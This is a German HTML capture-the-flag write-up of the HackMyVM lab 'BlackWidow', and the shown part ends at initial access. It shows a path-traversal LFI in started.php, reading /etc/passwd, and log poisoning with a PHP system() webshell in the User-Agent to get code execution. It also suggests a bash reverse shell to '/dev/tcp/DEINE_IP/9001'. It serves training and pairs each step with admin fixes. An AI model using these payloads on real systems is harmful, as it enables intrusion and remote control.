@@ -1,0 +1,573 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BlackWidow - HackMyVM - Hard - Vulnhub - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg"> <!-- CSS muss background-color: #03b5f5; setzen -->
+        <h1>BlackWidow - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- CSS muss hier die Farbe auf Rot setzen -->
+            <h2>Hard</h2>
+            <div class="circle">
+                 <!-- CSS muss hier die Farbe auf Rot setzen -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- CSS muss hier die Hintergrundfarbe auf ein passendes Rot setzen -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">php (implizit durch Exploit)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">script</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">linpeas.sh</div>
+                <div class="tool-item">perl (implizit durch Exploit)</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">pwd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root Exploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der `arp-scan -l` Befehl wird ausgeführt, um aktive Geräte im lokalen Netzwerk zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Gerät mit der IP <span class="command">192.168.2.140</span> und der MAC-Adresse `08:00:27:e5:8b:f0` (PCS Systemtechnik GmbH - VirtualBox) wird gefunden. Dies ist das Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP 192.168.2.140 für weitere Scans.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und ARP-Überwachung können helfen, die Sichtbarkeit zu reduzieren und Scans zu erkennen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/HackingTools]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.140	08:00:27:e5:8b:f0	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender `nmap`-Scan wird auf die Ziel-IP 192.168.2.140 durchgeführt, um offene Ports, Dienste, Versionen und Betriebssysteminformationen zu ermitteln.
+            <ul><li><code>-sS</code>: SYN-Scan.</li><li><code>-sC</code>: Standard-Skripte.</li><li><code>-T5</code>: Aggressives Timing.</li><li><code>-A</code>: Aggressive Optionen (OS/Version/Skript/Traceroute).</li><li><code>-p-</code>: Scan aller 65535 TCP-Ports.</li></ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan enthüllt eine Vielzahl offener Ports:
+            <ul><li><span class="command">22/tcp (SSH)</span>: OpenSSH 7.9p1 auf Debian 10. Ein möglicher Login-Vektor.</li><li><span class="command">80/tcp (HTTP)</span>: Apache httpd 2.4.38 auf Debian. Der primäre Webserver.</li><li><span class="command">111/tcp (rpcbind)</span>: Standard-RPC-Portmapper.</li><li><span class="command">2049/tcp (nfs_acl)</span>: NFS (Network File System)-bezogener Dienst.</li><li><span class="command">3128/tcp (http-proxy)</span>: Squid http proxy 4.6. Ein HTTP-Proxy läuft.</li><li><span class="command">43795/tcp, 44833/tcp, 54901/tcp, 60353/tcp</span>: Dynamische Ports, die von RPC-Diensten wie `nlockmgr` (Network Lock Manager) und `mountd` (NFS Mount Daemon) verwendet werden.</li></ul>
+            Das Vorhandensein von NFS und einem Squid-Proxy zusätzlich zum Webserver und SSH bietet mehrere potenzielle Angriffsflächen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Untersuchen Sie den Webserver (Port 80) auf Schwachstellen und Inhalte.</li><li>Prüfen Sie die NFS-Freigaben (`showmount -e 192.168.2.140`) und versuchen Sie, diese zu mounten, falls möglich.</li><li>Untersuchen Sie den Squid-Proxy (Port 3128) auf Fehlkonfigurationen (z.B. offener Proxy, Schwachstellen).</li><li>Halten Sie SSH (Port 22) für spätere Login-Versuche bereit.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Beschränken Sie den Zugriff auf alle Dienste (SSH, Apache, RPC/NFS, Squid) auf die notwendigen Netzwerke/IPs.</li><li>Konfigurieren Sie NFS sicher (Zugriffskontrollen, `no_root_squash` vermeiden).</li><li>Konfigurieren Sie Squid sicher (Zugriffskontrollen, keine offenen Proxies).</li><li>Halten Sie alle Dienste aktuell.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/HackingTools]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.140 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at ...
+Nmap scan report for 192.168.2.140
+Host is up (0.0010s latency).
+Not shown: 65526 closed tcp ports (reset)
+PORT      STATE SERVICE    VERSION
+======================================================================
+<span class="command">22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   2048 9c:ea:74:25:75:03:26:60:49:54:85:06:b6:15:98:4f (RSA)
+|   256 a0:34:05:19:d3:70:22:c7:7c:82:1f:18:98:3b:85:9e (ECDSA)
+|_  256 06:e4:08:62:43:6e:3d:53:6b:87:60:6b:5e:8f:7b:b8 (ED25519)
+<span class="command">80/tcp    open  http       Apache httpd 2.4.38 ((Debian))</span>
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Index of /
+<span class="command">111/tcp   open  rpcbind    2-4 (RPC 100000)</span>
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  3           2049/tcp  nfs
+|   100003  3           2049/udp  nfs
+|   100005  1,2,3      44833/tcp  mountd
+|   100005  1,2,3      49681/udp  mountd
+|   100021  1,3,4      43795/tcp  nlockmgr
+|   100021  1,3,4      35387/udp  nlockmgr
+|   100227  3           2049/tcp  nfs_acl
+|_  100227  3           2049/udp  nfs_acl
+<span class="command">2049/tcp  open  nfs_acl    3 (RPC 100227)</span>
+<span class="command">3128/tcp  open  http-proxy Squid http proxy 4.6</span>
+|_http-server-header: squid/4.6
+|_http-title: ERROR: The requested URL could not be retrieved
+<span class="command">43795/tcp open  nlockmgr   1-4 (RPC 100021)</span>
+<span class="command">44833/tcp open  mountd     1-3 (RPC 100005)</span>
+<span class="command">54901/tcp open  mountd     1-3 (RPC 100005)</span>
+<span class="command">60353/tcp open  mountd     1-3 (RPC 100005)</span>
+MAC Address: 08:00:27:E5:8B:F0 (PCS Systemtechnik GmbH)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.01 ms 192.168.2.140
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.77 seconds
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien im Web-Root (Port 80) zu finden. Eine Standard-Wortliste und gängige Erweiterungen werden verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Mehrere Verzeichnisse und Dateien werden gefunden:
+            <ul><li><code>/index.html</code>: Die Startseite.</li><li><code>/docs/</code>: Ein Dokumentationsverzeichnis.</li><li><code>/company/</code>: Sieht nach einem Hauptverzeichnis einer Anwendung oder Webseite aus.</li><li><code>/js/</code>: Ein JavaScript-Verzeichnis.</li></ul>
+            Zusätzlich werden einige spezifische Pfade angezeigt, die wahrscheinlich aus dem Quellcode der Seiten stammen oder manuell hinzugefügt wurden: `/company/started.php`, Bilddateien, `/company/forms/contact.php`. Das Verzeichnis `/company` und die Datei `started.php` erscheinen am interessantesten für die weitere Untersuchung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das `/company`-Verzeichnis und die `started.php`-Datei genauer. Führen Sie `gobuster` erneut auf `/company/` aus, um tiefere Strukturen zu finden. Analysieren Sie `index.html`, `changelog.txt` und `Readme.txt` auf Hinweise.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine unnötigen Dateien oder Verzeichnisse im Web-Root liegen. Beschränken Sie den Zugriff auf sensible Verzeichnisse oder Dateien (z.B. `/docs`, falls intern).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/HackingTools]
+└─# <span class="command">gobuster dir -u http://192.168.2.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[...]
+<span class="command">/index.html</span>           (Status: 200) [Size: 84]
+<span class="command">/docs</span>                 (Status: 301) [Size: 313] [--> http://192.168.2.140/docs/]
+<span class="command">/company</span>              (Status: 301) [Size: 316] [--> http://192.168.2.140/company/]
+<span class="command">/js</span>                   (Status: 301) [Size: 311] [--> http://192.168.2.140/js/]
+[...]
+===============================================================
+</pre>
+<pre><span class="comment">
+Zusätzliche Pfade (vermutlich aus Quellcode/manueller Analyse):
+http://blackwidow/company/started.php
+http://192.168.2.140/company/assets/img/skills.png
+http://192.168.2.140/company/assets/img/portfolio/portfolio-1.jpg
+http://192.168.2.140/company/assets/img/team/team-2.jpg
+http://192.168.2.140/company/forms/contact.php
+</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird erneut ausgeführt, diesmal gezielt auf das Unterverzeichnis `/company/assets/`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es werden Standard-Asset-Verzeichnisse gefunden: `/img/`, `/css/`, `/js/`, `/vendor/`. Dies bestätigt die Struktur, liefert aber keine direkten neuen Angriffspunkte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Verzeichnisse enthalten normalerweise keine serverseitige Logik, aber man könnte sie nach interessanten JavaScript-Dateien oder Konfigurationsdateien durchsuchen, die versehentlich dort abgelegt wurden.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass in Asset-Verzeichnissen keine sensiblen Dateien liegen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/HackingTools]
+└─# <span class="command">gobuster dir -u http://192.168.2.140/company/assets/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[...]
+<span class="command">/img</span>                  (Status: 301) [Size: 327] [--> http://192.168.2.140/company/assets/img/]
+<span class="command">/css</span>                  (Status: 301) [Size: 327] [--> http://192.168.2.140/company/assets/css/]
+<span class="command">/js</span>                   (Status: 301) [Size: 326] [--> http://192.168.2.140/company/assets/js/]
+<span class="command">/vendor</span>               (Status: 301) [Size: 330] [--> http://192.168.2.140/company/assets/vendor/]
+[...]
+===============================================================
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein weiterer `gobuster`-Scan, diesmal auf das Verzeichnis `/company/`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Scan bestätigt die bereits bekannten Dateien und Verzeichnisse (`index.html`, `assets`, `forms`). Neu entdeckt werden:
+            <ul><li><code>/changelog.txt</code>: Könnte Informationen über verwendete Softwareversionen oder Änderungen enthalten.</li><li><code>/Readme.txt</code>: Könnte Installationshinweise oder Standard-Zugangsdaten enthalten.</li><li><code>/started.php</code>: Wird erneut gefunden, was seine Bedeutung unterstreicht.</li></ul></p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie `changelog.txt` und `Readme.txt` herunter und analysieren Sie deren Inhalt. Konzentrieren Sie die weitere Untersuchung auf `started.php`, da PHP-Dateien oft Angriffspunkte für Local File Inclusion (LFI) oder Remote Code Execution (RCE) bieten.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige Dateien wie `changelog.txt` oder `Readme.txt` von Produktionsservern, wenn sie sensible Informationen enthalten könnten.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/HackingTools]
+└─# <span class="command">gobuster dir -u http://192.168.2.140/company/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[...]
+<span class="command">/index.html</span>           (Status: 200) [Size: 42271]
+<span class="command">/assets</span>               (Status: 301) [Size: 323] [--> http://192.168.2.140/company/assets/]
+<span class="command">/forms</span>                (Status: 301) [Size: 322] [--> http://192.168.2.140/company/forms/]
+<span class="command">/changelog.txt</span>        (Status: 200) [Size: 1175]
+<span class="command">/Readme.txt</span>           (Status: 200) [Size: 222]
+<span class="command">/started.php</span>          (Status: 200) [Size: 42271]
+[...]
+===============================================================
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `wfuzz` wird verwendet, um die Datei `started.php` auf Local File Inclusion (LFI)-Schwachstellen zu testen. Es wird versucht, Parameter zu finden, indem der Wert auf `../../../../etc/passwd` gesetzt wird. Der Hostname `blackwidow` wird verwendet, dieser muss also zuvor in `/etc/hosts` eingetragen worden sein (`192.168.2.140 blackwidow`). Die Optionen `--hc=500` (verstecke Serverfehler) und `--hh 42271` (verstecke Antworten mit der Größe der normalen Seite) sollen irrelevante Ergebnisse ausfiltern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `wfuzz` identifiziert den Parameter `<span class="command">file</span>` als potenziell anfällig. Die Antwort hat Status 200 und eine Größe von 0, was darauf hindeutet, dass die Datei `/etc/passwd` entweder nicht inkludiert werden konnte (Berechtigungsfehler) oder der LFI-Versuch selbst die normale Ausgabe unterdrückt hat, aber der Parameter erkannt wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da der Parameter `file` gefunden wurde, testen Sie ihn gezielt auf LFI. Versuchen Sie, bekannte Dateien wie `/etc/passwd` oder `/etc/hosts` mit verschiedenen Path-Traversal-Tiefen einzubinden (`?file=../../etc/passwd`, `?file=../../../etc/passwd` etc.). Verwenden Sie eine LFI-spezifische Wortliste mit `wfuzz`.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie sichere Dateipfadvverarbeitung in `started.php`. Vermeiden Sie es, Benutzereingaben direkt in Dateipfadfunktionen (`include`, `require`, `file_get_contents` etc.) zu verwenden. Validieren und bereinigen Sie alle Eingaben und beschränken Sie den Zugriff auf erlaubte Verzeichnisse.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/HackingTools]
+└─# <span class="command">wfuzz -u "http://blackwidow/company/started.php?FUZZ=../../../../etc/passwd" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  --hc=500 --hh 42271</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://blackwidow/company/started.php?FUZZ=../../../../etc/passwd
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000000759:   200        0 L      0 W        0 Ch        "file"</span>
+
+[...]
+Total time: ...
+Processed Requests: 220560
+Filtered Requests: 220559
+Requests/sec.: ...
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach der Identifizierung des `file`-Parameters wird `wfuzz` erneut verwendet, diesmal mit einer LFI-spezifischen Wortliste (`LFI-LFISuite-pathtotest.txt`), um verschiedene Path-Traversal-Sequenzen und Dateinamen zu testen. Antworten mit Status 500 (Serverfehler) und Größe 0 werden versteckt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">LFI bestätigt!</span> Mehrere Payloads führen erfolgreich zum Einbinden von `/etc/passwd` und `/etc/group`. Die Antworten haben Status 200 und eine von 0 abweichende Größe (1582 Chars für passwd, 727 für group). Die erfolgreichen Payloads verwenden eine große Anzahl von `../`-Sequenzen, was darauf hindeutet, dass eine einfache Filterung umgangen werden muss.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Sie können nun beliebige Dateien lesen, auf die der `www-data`-Benutzer Lesezugriff hat.</li><li>Lesen Sie wichtige Konfigurationsdateien (z.B. `/etc/apache2/apache2.conf`, `/etc/squid/squid.conf`, `/etc/exports` für NFS).</li><li>Versuchen Sie, Quellcode von PHP-Dateien zu lesen, z.B. `started.php` selbst oder `contact.php`, indem Sie PHP-Wrapper verwenden: `?file=php://filter/convert.base64-encode/resource=started.php`.</li><li>Untersuchen Sie Möglichkeiten zur Codeausführung über LFI, z.B. durch Log Poisoning (Apache-Logs einbinden) oder Ausnutzung von `/proc/self/environ`.</li></ol>
+            <strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle in `started.php` dringend (siehe vorherige Empfehlung). Überprüfen Sie die Dateiberechtigungen, um sicherzustellen, dass der Webserver-Benutzer (`www-data`) nur auf die absolut notwendigen Dateien Lesezugriff hat.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">wfuzz -u "http://blackwidow/company/started.php?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt --hc=500 --hh 0</span></div>
+                    <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://blackwidow/company/started.php?file=FUZZ
+Total requests: 569
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000000062:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../../../etc/passwd"</span>
+<span class="command">000000061:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../etc/passwd"</span>
+<span class="command">000000060:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../etc/passwd"</span>
+<span class="command">000000403:   200        55 L     55 W       727 Ch      "../../../../../../../../../../../../../etc/group"</span>
+<span class="command">000000404:   200        55 L     55 W       727 Ch      "../../../../../../../../../../../../../../etc/group"</span>
+
+[...]
+Total time: ...
+Processed Requests: 569
+Filtered Requests: 564
+Requests/sec.: ...
+</pre>
+<pre><span class="comment">Erfolgreiche URL zum Lesen von /etc/passwd:</span>
+<span class="command">http://blackwidow/company/started.php?file=../../../../../../../../../../../../../../etc/passwd</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `/etc/passwd` wird über die LFI-Schwachstelle mit `curl` abgerufen und mit `grep bash` nach Benutzern gefiltert, die eine Bash-Shell haben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Zwei Benutzer mit Bash-Shell werden identifiziert:
+             <ul><li>`root`: Der Systemadministrator.</li><li>`<span class="command">viper</span>`: Ein regulärer Benutzer.</li></ul>
+             Dies gibt uns potenzielle Benutzernamen für Brute-Force-Angriffe oder Passwort-Wiederverwendungstests.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie den Benutzernamen `viper`. Fahren Sie mit der LFI-Ausnutzung fort, um weitere Informationen zu sammeln oder Codeausführung zu erreichen (z.B. Log Poisoning).
+             <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle. Überprüfen Sie die Notwendigkeit von Benutzerkonten und deren Shell-Zugriff.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">curl http://blackwidow/company/started.php?file=../../../../../../../../../../../../../../etc/passwd | grep bash</span></div>
+                    <pre>
+<span class="password">root:x:0:0:root:/root:/bin/bash</span>
+<span class="password">viper:x:1001:1001:Viper,,,:/home/viper:/bin/bash</span></pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Dieser Befehl extrahiert das neunte Feld (vermutlich Pfade) aus jeder Zeile einer Datei `log.txt` (deren Inhalt unbekannt ist, aber wahrscheinlich Log-Einträge enthält), entfernt Anführungszeichen und fügt das Ergebnis an eine Wortliste `/usr/share/wordlists/logfiles.txt` an. Diese Wortliste wird dann mit `wfuzz` verwendet, um über die LFI-Schwachstelle auf diese Log-Dateipfade zuzugreifen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der `wfuzz`-Scan findet mehrere potenzielle Log-Dateipfade, die mit Status 200 antworten, aber alle haben eine Größe von 0 Chars. Dies deutet darauf hin, dass die Dateien entweder leer sind oder der `www-data`-Benutzer keine Leseberechtigung hat. Ein wichtiger Pfad ist jedoch `/var/log/apache2/access_log`, der häufig für Log Poisoning verwendet wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf den Pfad `/var/log/apache2/access.log` (oder `access_log`). Versuchen Sie, diesen über LFI einzubinden und durch eine speziell präparierte Anfrage (z.B. mit PHP-Code im User-Agent) Code auszuführen (Log Poisoning).
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Logdateien, insbesondere Apache-Logs, korrekte Berechtigungen haben und nicht vom Webserver-Benutzer gelesen werden können, wenn dies nicht unbedingt erforderlich ist. Implementieren Sie Log-Rotation und -Bereinigung.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">cat log.txt|awk '{print $9}' | tr -d '"' >> /usr/share/wordlists/logfiles.txt</span></div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">wfuzz -u "http://blackwidow/company/started.php?file=../../../../../../../../../../../../../../../..FUZZ" -w /usr/share/wordlists/logfiles.txt --hc=500</span></div>
+                     <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://blackwidow/company/started.php?file=../../../../../../../../../../../../../../../..FUZZ
+Total requests: 92
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+<span class="command">000000016:   200        0 L      0 W        0 Ch        "/var/log/apache2/access_log"</span>
+<span class="command">000000011:   200        0 L      0 W        0 Ch        "/var/www/logs/access_log"</span>
+<span class="command">000000010:   200        0 L      0 W        0 Ch        "/etc/httpd/logs/error.log"</span>
+<span class="command">000000013:   200        0 L      0 W        0 Ch        "/usr/local/apache/logs/access_log"</span>
+<span class="command">000000006:   200        0 L      0 W        0 Ch        "/apache/logs/access.log"</span>
+<span class="command">000000008:   200        0 L      0 W        0 Ch        "/etc/httpd/logs/acces.log"</span>
+<span class="command">000000009:   200        0 L      0 W        0 Ch        "/etc/httpd/logs/error_log"</span>
+<span class="command">000000005:   200        0 L      0 W        0 Ch        "/apache/logs/error.log"</span>
+<span class="command">000000012:   200        0 L      0 W        0 Ch        "/var/www/logs/access.log"</span>
+[...]
+Total time: ...
+Processed Requests: 92
+Filtered Requests: [...]
+Requests/sec.: ...
+</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Eine Anfrage wird mit `curl` an das Zielsystem (IP 192.168.2.141 - Änderung beachten!) gesendet. Entscheidend ist der User-Agent-Header (`-A`), der auf `<span class="password"><?php system($_GET[cmd]); ?></span>` gesetzt wird. Dies ist der Versuch, PHP-Code in die Apache-Logdatei zu schreiben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wenn der Apache-Server den User-Agent unverändert in die `access.log`-Datei schreibt, wird dieser PHP-Code dort gespeichert. Wenn anschließend die `access.log` über die LFI-Schwachstelle eingebunden wird, interpretiert der PHP-Interpreter den Code in der Logdatei und führt ihn aus. Dies ist die Grundlage für Log Poisoning.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Binden Sie die Apache-Logdatei über die LFI ein: `http://192.168.2.141/company/started.php?file=../../../../../../../../../../../../../../../../var/log/apache2/access.log`.</li><li>Fügen Sie einen `cmd`-Parameter hinzu, um den injizierten Code auszuführen: `...access.log&cmd=id`. Überprüfen Sie, ob der Befehl ausgeführt wird (die Ausgabe sollte im HTML-Quellcode der Antwort sichtbar sein).</li><li>Wenn dies funktioniert, verwenden Sie den `cmd`-Parameter, um eine Reverse Shell zu erhalten.</li></ol>
+            <strong>Empfehlung (Admin):</strong> Konfigurieren Sie Apache so, dass potenziell gefährliche Zeichen in Logeinträgen (insbesondere im User-Agent) maskiert oder entfernt werden. Beschränken Sie die Leserechte auf Logdateien. Beheben Sie die LFI-Schwachstelle.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/usr/share/seclists]
+└─# <span class="command">curl -A '<?php system($_GET[cmd]); ?>' 192.168.2.141</span></div>
+                    <pre>
+<html>
+<img src="wallpaper.jpg" alt="wallpaper" width="100%" height="100%">
+</html></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Versuch, den PHP-Code in die Logs zu injizieren, wird `curl` verwendet, um die `access.log` über die LFI einzubinden und gleichzeitig den Parameter `cmd=id` anzuhängen. Die Ausgabe wird nach "data" gefiltert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Log Poisoning erfolgreich!</span> In der Ausgabe der Logdatei findet sich die Zeile `<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>`. Dies ist die Ausgabe des `id`-Befehls, der durch den injizierten PHP-Code (`system($_GET['cmd'])`) ausgeführt wurde, als die Logdatei eingebunden wurde. Der Angreifer hat nun Remote Code Execution als `www-data`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `cmd`-Parameter-Schwachstelle, um eine Reverse Shell zu erhalten. Starten Sie einen Listener (`nc -lvnp 9001`) und senden Sie den entsprechenden Payload (URL-kodiert) mit `curl` oder im Browser: `curl 'http://192.168.2.141/company/started.php?file=../../../../../../../../../../../../../../../../var/log/apache2/access.log&cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FDEINE_IP%2F9001%200%3E%261%27'`
+            <br><strong>Empfehlung (Admin):</strong> Beheben Sie die LFI-Schwachstelle und konfigurieren Sie das Logging sicher (siehe vorherige Empfehlungen).</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="comment"># Frühere Versuche, den richtigen Log-Pfad zu finden (nicht notwendig für das Verständnis des Erfolgs):</span></pre>
+                     <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">wfuzz -u "http://192.168.2.141/company/started.php?file=../../../../../../../../../../../../../../../..FUZZ" -w /usr/share/wordlists/logfiles.txt --hc=500  | grep apache | grep acces</span></div>
+                     <pre>[...]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">curl http://192.168.2.141/company/started.php?file=../../../../../../../../../../../../../../../../var/log/apache2/access.log</span></div>
+                     <pre>[...]</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[]
+└─# <span class="command">curl 'http://192.168.2.141/company/started.php?file=../../../../../../../../../../../../../../../../var/log/apache2/access.log&cmd=id' | grep data</span></div>
+                     <pre>
+[...] <span class="comment">(Viele Log-Zeilen)</span>
+192.168.2.114 - - [09/Sep/2022:10:52:02 -0400] "GET / HTTP/1.1" 200 334 "-" "<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>\n"
+[...]</pre>
+                 </div>
+             </div>
+
